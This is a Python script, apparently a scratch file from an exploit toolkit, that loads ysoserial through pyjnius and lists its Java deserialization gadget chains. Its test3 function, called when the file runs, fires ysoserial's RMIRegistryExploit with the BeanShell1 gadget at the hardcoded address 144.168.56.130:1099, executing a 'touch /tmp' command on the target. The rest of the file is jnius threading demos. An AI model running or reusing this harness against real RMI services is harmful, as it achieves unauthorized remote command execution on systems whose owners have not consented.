# !/usr/bin/env python3
# @Time    : 2020/7/16
# @Author  : caicai
# @File    : jnius_example.py


import os
import threading
from queue import Queue
# 1. os.environ['CLASSPATH'] = '/home/aaron/workspace/javatest.jar'
# 2. os.environ['CLASSPATH'] = '/home/aaron/workspace/JavaTest/bin'

# import jnius_config

# 3. jnius_config.set_classpath('.','/home/aaron/workspace/JavaTest/bin')
os.environ['CLASSPATH'] = '/Users/yoyoo/Software/pocsuite3-master/pocsuite3/exp/rmi/ysoserial.jar'
# jnius_config.set_classpath('.','/Users/yoyoo/Software/pocsuite3-master/pocsuite3/exp/rmi/ysoserial.jar')
# from jnius import autoclass
import jnius




def mythread(func, mapslist, thread_num):
    threads = []
    queue = Queue()
    for i in mapslist:
        queue.put(i)
    for x in range(0, int(thread_num)):
        threads.append(tThread(queue, func))

    for t in threads:
        t.start()
    for t in threads:
        t.join()


class tThread(threading.Thread):
    def __init__(self, queue, func):
        threading.Thread.__init__(self)
        self.queue = queue
        self.func = func

    def run(self):

        while not self.queue.empty():
            arg = self.queue.get()
            try:
                self.func(arg)
            except Exception as e:
                print("{} run thread error:{}".format(arg, str(e)))
                # traceback.print_exc()

def test1():
    Stack = jnius.autoclass('java.util.Stack')
    stack = Stack()
    stack.push('hello')
    stack.push('world')

    print(stack.pop())  # --> 'world'
    print(stack.pop())  # --> 'hello'
payloads = ["C3P0", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2",
            "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "Groovy1",
            "Hibernate1", "Hibernate2", "JBossInterceptors1", "JSON1", "JavassistWeld1", "Jdk7u21", "MozillaRhino1",
            "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "BeanShell1"]


def test2(arg):
    try:
        c=jnius.autoclass("ysoserial.exploit.RMIRegistryExploit")
        c.main(arg)
    except jnius.JavaException as e:
        if e.classname=="java.rmi.ServerException":
            print("have a rmi error")
    finally:
        jnius.detach()
def test3():
    tasks = []
    for i,payload in enumerate(payloads[:3]):
        tasks.append(["144.168.56.130", "1099", "BeanShell1", "touch /tmp/{}".format(i)])
    mythread(test2,tasks,1)
def test4():
    # import threading
    # from jnius import autoclass

    class MyThread(threading.Thread):

        def run(self):
            try:
                jnius.autoclass('java.lang.System').out.println('Hello world')
            except:
                pass
            finally:
                jnius.detach()

    for i in range(10000):
        MyThread().start()
def test5():
    for i in range(1000):
        print("hello World")
test3()